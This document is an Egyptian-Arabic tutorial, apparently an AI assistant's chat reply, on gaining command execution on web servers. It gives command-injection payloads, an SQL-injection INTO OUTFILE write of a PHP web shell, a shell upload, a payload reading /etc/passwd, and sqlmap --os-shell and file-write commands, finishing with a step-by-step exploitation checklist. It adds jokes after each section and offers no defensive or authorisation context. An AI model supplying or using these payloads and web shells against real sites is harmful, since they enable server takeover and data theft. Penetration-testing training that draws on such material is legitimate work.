تمام، هنشرح استغلال **System Command Execution** (تنفيذ أوامر النظام) بعمق عملي مع أكواد وتفاصيل، وهنركز على الجوانب اللي تهمك كـ pentester. هقسم الموضوع لأجزاء عن التقنيات المختلفة، وبعد كل جزء هحط خلاصة طريفة بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال. يلا نبدأ!

---

### **1. استغلال Command Injection عبر مدخلات المستخدم**
#### **إيه هو؟**
Command Injection بيحصل لما الموقع بياخد مدخلات منك (زي حقل بحث أو أمر) ويمررها مباشرة للسيرفر عشان ينفذها كأوامر نظام من غير فلترة.

#### **ازاي بيشتغل؟**
بتحط أوامر نظام (زي `whoami` أو `ls`) مع الفاصلة المناسبة (`;` أو `&&`) عشان تضيف أمرك للأمر الأصلي.

#### **مثال عملي:**
- لنفترض عندك حقل في موقع بياخد IP ويعمل ping:
  ```
  http://example.com/ping.php?ip=127.0.0.1
  ```
  الكود في الباك إند:
  ```php
  system("ping " . $_GET['ip']);
  ```
- جرب:
  ```
  http://example.com/ping.php?ip=127.0.0.1;whoami
  ```
  لو السيرفر نفذ الأمرين، هيرجعلك نتيجة الـ ping واسم المستخدم (زي `www-data`).

- **اختبار أمر مختلف:**
  ```
  http://example.com/ping.php?ip=127.0.0.1&&dir
  ```
  لو السيرفر Windows، هيطلعلك محتويات المجلد.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "روح جيبلي عصير، وبعدين قوللي اسمك"، لو جابلك العصير وقالك اسمه، يبقى هو بيسمع كلامك زيادة عن اللزوم!

---

### **2. استغلال SQL Injection لتنفيذ أوامر النظام**
#### **إيه هو؟**
لو الداتابيز عندها صلاحيات عالية (زي MySQL مع `FILE` privileges)، تقدر تستخدم SQL Injection عشان تكتب ملف على السيرفر وتنفذ أوامر من خلاله.

#### **ازاي بيشتغل؟**
بتستخدم أوامر زي `INTO OUTFILE` عشان تكتب ملف شيل (Shell) وبعدين تستخدمه.

#### **مثال عملي:**
- **اختبار الصلاحيات:**
  ```
  ' UNION SELECT 1, @@version, @@datadir --
  ```
  لو رجعلك مسار زي `/var/www/html/`، يبقى تقدر تكتب ملف.

- **كتابة شيل:**
  ```
  ' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
  ```
  افتح:
  ```
  http://example.com/shell.php?cmd=whoami
  ```
  لو رجعلك اسم المستخدم، يبقى نجح.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحب البيت "كتبلي ورقة للخدامين يسمعوا كلامي"، لو كتبها ونفذوا الأوامر، يبقى بقيت إنت الكبير في البيت!

---

### **3. استغلال File Upload لتنفيذ أوامر**
#### **إيه هو؟**
لو الموقع بيسمحلك ترفع ملفات من غير ما يفحصها كويس، تقدر ترفع ملف فيه كود (زي PHP Shell) وتنفذ أوامر من خلاله.

#### **ازاي بيشتغل؟**
بترفع ملف فيه كود تنفيذي وبعدين تطلبه من السيرفر عشان يشتغل.

#### **مثال عملي:**
- **إنشاء الملف:**
  ```
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  ```
- ارفعه في حقل Upload في الموقع.
- لو الملف اتresolve لـ:
  ```
  http://example.com/uploads/shell.php
  ```
  افتحه:
  ```
  http://example.com/uploads/shell.php?cmd=whoami
  ```
  لو رجعلك اسم المستخدم، يبقى شغال.

#### **خلاصة طريفة:**
تخيل إنك بتبعت هدية لصاحبك فيها رسالة "افتح الباب واديني كل حاجة"، لو فتحها ونفذ، يبقى البيت بقى بتاعك!

---

### **4. استغلال Misconfigured Functions**
#### **إيه هو؟**
بعض الدوال في لغات البرمجة (زي `system()` أو `exec()` في PHP) لو اتسخدمت غلط، بتسمحلك تنفذ أوامر نظام لو قدرت تحقن كود.

#### **ازاي بيشتغل؟**
بتلاقي حقل أو باراميتر بيترجم مباشرة لدالة تنفيذية، وتحقن أمر معاها.

#### **مثال عملي:**
- لو موقع بياخد إدخال ويستخدمه في:
  ```php
  exec("cat " . $_GET['file']);
  ```
  جرب:
  ```
  http://example.com/script.php?file=/etc/passwd;whoami
  ```
  هيجيبلك الملف وينفذ الأمر.

#### **خلاصة طريفة:**
تخيل إنك بتقول للجرسون "جيبلي الأكل من المطبخ، وكمان قوللي مين اللي طبخه"، لو نفذ الاتنين، يبقى هو بيخدمك أكتر من اللازم!

---

### **خطوات عملية للاستغلال كـ Pentester**
1. **اختبار Command Injection:**
   - في أي حقل أو باراميتر (زي `ip` أو `file`):
     ```
     127.0.0.1;whoami
     ```
     أو:
     ```
     127.0.0.1&&dir
     ```
     لو رجع نتيجة، يبقى شغال.

2. **استغلال SQL Injection:**
   - جرب:
     ```
     ' UNION SELECT 1, @@datadir --
     ```
     لو لقيت مسار، اكتب شيل:
     ```
     ' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
     ```
     افتح `shell.php?cmd=whoami`.

3. **استغلال File Upload:**
   - اصنع ملف:
     ```
     echo '<?php system($_GET["cmd"]); ?>' > shell.php
     ```
   - ارفعه وجرب:
     ```
     http://example.com/uploads/shell.php?cmd=whoami
     ```

4. **اختبار Misconfigured Functions:**
   - لو في باراميتر زي `file`:
     ```
     http://example.com/script.php?file=test;whoami
     ```
     أو:
     ```
     test&&netstat -an
     ```

5. **استخدام أدوات (sqlmap):**
   - جرب شيل:
     ```
     sqlmap -u "http://example.com/product.php?id=1" --os-shell
     ```
   - أو اكتب ملف:
     ```
     sqlmap -u "http://example.com/product.php?id=1" --file-write=/home/user/shell.php --file-dest=/var/www/html/shell.php
     ```

#### **نصيحة:**
- جرب فواصل مختلفة (`;`, `&&`, `|`, `&`) عشان تعرف أي واحد بيشتغل.
- لو السيرفر بيرجع أخطاء، استخدمها عشان تعرف نوع النظام (Linux/Windows).

---

ها، عايز أشرح حاجة زيادة زي ازاي تتأكد من نوع النظام أو أعمق في أدوات؟